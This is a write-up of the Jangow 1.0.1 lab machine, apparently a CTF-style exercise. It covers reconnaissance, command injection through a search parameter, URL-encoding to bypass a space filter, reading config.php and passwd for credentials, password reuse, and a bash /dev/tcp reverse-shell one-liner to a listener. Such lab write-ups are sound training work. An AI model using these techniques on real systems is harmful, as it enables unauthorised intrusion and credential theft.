# Jangow-1.0.1-Write-up
Jangow: 1.0.1 Walkthrough
I'll add here vulnerable machine solution.
After running machine on VirtualBox, first i run arp-scan -l command to discover the ip address of the target.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/0804170b-793e-44c8-a6f2-c89015663c7a)
Yes, our target's IP is 192.168.56.118. Hence I run a nmap scan do view the open ports and running services.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/3715a5eb-cb53-4086-a6cf-639c2cbeec2a)
 It seems port 21 and 80 is open. First I tried FTP login with anonymous/anonymous but didn't work. I started to play around web service.
 ![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/9876a466-52b1-4d4d-9101-96fd8ca5d761)
after click on the site:
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/23a0e5be-5733-4ea8-9798-4eb5ccc6b311)
Then I used nikto to scan the static web site. But I couldn't find anything important.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/d528c360-9e70-48f6-bb73-44f21ca02975)

Additionally, I run dirbuster and found /wordpress folder but seems that its just a copy of the original web site.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/a1e926a9-3f39-402e-9169-67c72c4cda01)
I wondered config.php and from here just got a username.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/29717a00-1196-4828-9ce3-efd88806608a)
On the website, there is just one dynamic point that raises my attention. that is Buscar.

![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/6b6d9312-f44c-44da-94b3-71cd3f5b9f80)
 When we click on it nothing happens. I decided to open it with Burp to manipulate the request.
 ![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/675bedd0-a222-4dfa-b9fb-e755cffc455a)
 
Whatever i type here without space, returning 200 success. First I used intruder and gave the numbers to 1000, and nothing found.
Then i gave a wordlist and analysed the result. Bingo, it's kinda command injection vulnerability.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/71403d71-5a39-4d22-8c57-d2ab7f734863)

![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/04f856c5-4456-429b-a5e5-5b40c537f56d)

Request is directly running the command after the equal sign. Let's try our own.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/767e7259-0f37-4237-be41-7224642bf1ff)
Now, we have a good opportunity to work around the system. I remember config.php file and I tried to read it over here.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/7c44c389-3044-4211-9d60-cba408cca56c)
config.php is under wordpress folder, we shouldn't use spaces while typing so we're unable to use cat wordpress/config.php.
to overcome this situation we can use url encoding. 
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/5f1d98b2-3baf-4e7f-ab3b-fcc524725a84)
and put it to the request.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/7fb84dac-3b57-453c-bdad-a9df38e29e7d)

Bingo!. We've a username and password for the DB connection. I'll try them for the FTP service. but it didn't work.
let's view the passwd file for the available users.

![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/db0d6010-b6c8-4b39-b511-194fd65af953)



![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/8a0ab688-3000-41e9-a92e-e47512170e5a)
there is a jangow01 user on the system. Let's try the previous password for this user.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/6ca03521-de7b-4a55-a69d-7c1bdce250ae)
Finally it worked!
And here is the flag for the user.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/ff0f84cd-8834-4e6e-b157-89a60d578282)

 to gain root level access, I wanted to get a shell access so i used pentestmonkey's php reverse shell located in /usr/share
 /webshells/php/php-reverse.php and modified the file.
 ![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/24047265-8f56-471e-bada-0fdd0c130221)
via FTP uploaded to the target and started a netcat listener. But it didn't work, also i tried netcat to get a reverse shell didn't work as well in my case. finally i used bash's builtin function of /dev/tcp on port 443 and it worked.
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/443 0>&1 '
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/d06232a2-c072-4a82-8da3-ba7db469704e)
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/293d1e97-4114-4888-97a1-8f05415f1610)
And here is the user's flag.
![image](https://github.com/harunsvnc/Jangow-1.0.1-Write-up/assets/75423540/e777a706-dcf3-427b-a292-86a0fc79ea1a)



